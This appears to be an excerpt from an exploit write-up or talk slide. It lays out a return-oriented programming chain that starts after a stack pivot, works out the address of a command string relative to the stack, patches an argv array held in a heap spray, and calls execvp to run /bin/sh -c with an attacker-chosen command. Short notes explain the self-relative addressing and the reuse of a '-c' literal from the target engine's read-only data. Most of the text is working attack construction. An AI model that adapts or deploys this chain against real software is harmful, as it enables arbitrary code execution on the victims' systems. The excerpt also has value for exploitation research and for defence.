Self-relative addressing → execvp

the chain (after the pivot, RSP = blob+32)
push rsp ; pop rcx ; ret      ; rcx = &blob[40]
pop rax ; ret                 ; rax = CMD_OFFSET - 0x34
add rax, rcx ; add rax,0x12   ; rax = &command   (self-relative)
  ; ... pop rbp ; ret
pop rdi ; ret                 ; rdi = &spray.argv[2]
mov [rdi], rax ; ... ; ret    ; argv[2] = &command
pop rdi ; ret                 ; rdi = "/bin/sh"
pop rsi ; ret                 ; rsi = &spray.argv
call execvp@plt               ; execvp("/bin/sh",
                              ;   {"/bin/sh","-c",&cmd,NULL})

Self-relative push rsp; pop rcx recovers the runtime stack pointer, so &command is computed on the fly — the command can live in the blob, with no pre-known address.

Run-time argv[2] The three other argv cells are baked into the spray; only the command pointer is patched in via mov [rdi], rax.

Free literal argv[1] = "-c\0" is taken straight from the engine's .rodata — one fewer spray dependency.
